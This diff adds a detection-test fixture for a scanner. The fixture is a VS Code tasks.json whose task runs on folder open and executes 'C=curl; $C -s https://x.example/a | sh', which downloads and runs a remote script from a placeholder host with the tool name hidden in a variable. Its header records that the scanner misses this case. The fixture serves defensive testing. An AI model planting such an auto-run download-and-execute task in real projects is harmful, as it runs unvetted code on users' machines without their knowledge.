@@ -1,0 +1,16 @@
+# A download by a tool name in a variable
+want: editor-task-command suspicious-command
+miss: the pattern does not expand shell variables (FOU-496)
+have: editor-task-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "C=curl; $C -s https://x.example/a | sh",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
